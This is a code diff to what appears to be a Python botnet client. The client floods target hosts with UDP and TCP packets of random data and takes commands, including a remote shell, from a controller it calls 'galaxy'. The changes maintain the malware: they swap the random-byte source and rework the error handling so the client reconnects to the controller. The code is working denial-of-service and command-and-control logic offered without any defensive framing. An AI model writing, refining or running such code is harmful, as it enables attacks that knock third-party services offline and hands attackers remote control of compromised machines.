@@ -34,7 +34,7 @@ def ddos_udp(target_ip, target_port):
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             s.connect((str(target_ip), int(target_port)))
-            s.sendto(random._urandom(10240), (str(target_ip), int(target_port)))
+            s.sendto(os.urandom(10240), (str(target_ip), int(target_port)))
             s.close()
             requests_sent += 1
         except IOError:
@@ -49,7 +49,7 @@ def ddos_tcp(target_ip, target_port):
         try:
             s.connect((str(target_ip), int(target_port)))
             s.setblocking(0)
-            s.sendto(random._urandom(10240), (str(target_ip), int(target_port)))
+            s.sendto(os.urandom(10240), (str(target_ip), int(target_port)))
             requests_sent += 1
         except IOError:
             time.sleep(10)
@@ -222,12 +222,11 @@ def connection_handler():
                 elif "shellcmd start bufsize " in data:
                     planet_socket.send(f"planet ID: {planet_id} shelled".encode())
                     shell(int(data.replace("shellcmd start bufsize ", "").strip()))
-            except Exception:
+            except IOError as e:
                 print("Having trouble connecting to galaxy, attempting to reconnect...")
+                print(f"Error: {e}")
                 planet_online = False
                 connect_to_galaxy()
-            except IOError as e:
-                print(e)
             time.sleep(1)
         planet_attacking = False
 
